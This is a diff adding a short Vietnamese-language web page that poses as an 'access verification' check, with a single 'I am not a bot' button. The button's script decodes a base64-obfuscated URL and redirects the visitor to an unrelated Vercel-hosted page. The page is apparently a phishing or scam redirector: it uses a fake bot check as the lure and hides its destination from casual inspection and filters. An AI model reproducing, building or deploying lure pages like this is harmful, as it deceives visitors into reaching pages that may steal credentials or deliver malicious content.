@@ -1,0 +1,54 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Tiếp tục truy cập</title>
+  <script>
+    function redirect() {
+      const encoded = 'aHR0cHM6Ly9haWNoYXRzcGNhczQxLnZlcmNlbC5hcHAvaHRjdC50aWsvcGFnZS5odG1s';
+      const url = atob(encoded);
+      window.location.href = url;
+    }
+  </script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #fefcea, #f1da36);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .box {
+      background: #fff;
+      padding: 2rem 3rem;
+      border-radius: 1rem;
+      text-align: center;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.15);
+    }
+    .btn {
+      padding: 0.8rem 2rem;
+      background: #1a73e8;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 999px;
+      cursor: pointer;
+    }
+    .btn:hover {
+      background: #125cc6;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>🎯 Xác minh truy cập</h2>
+    <p>Vui lòng bấm nút dưới đây để tiếp tục.</p>
+    <button class="btn" onclick="redirect()">Tôi không phải là bot</button>
+  </div>
+</body>
+</html>
